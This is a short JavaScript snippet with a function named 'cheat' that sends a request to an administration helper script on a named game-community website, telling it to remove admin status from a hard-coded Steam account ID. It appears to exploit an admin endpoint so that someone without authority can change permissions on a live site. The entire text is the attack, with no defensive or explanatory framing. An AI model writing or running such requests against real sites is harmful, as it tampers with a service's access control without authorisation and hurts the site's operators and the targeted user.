function cheat()
{
	var txt;
	var steamid64 = "76561198102216167";
		$.get("http://ptfun.net/newsite/pub_inc/painel_administration_helper.php?function=removeadmin&communityid=".concat(steamid64), function(data, status){
		window.alert("done");
		});
}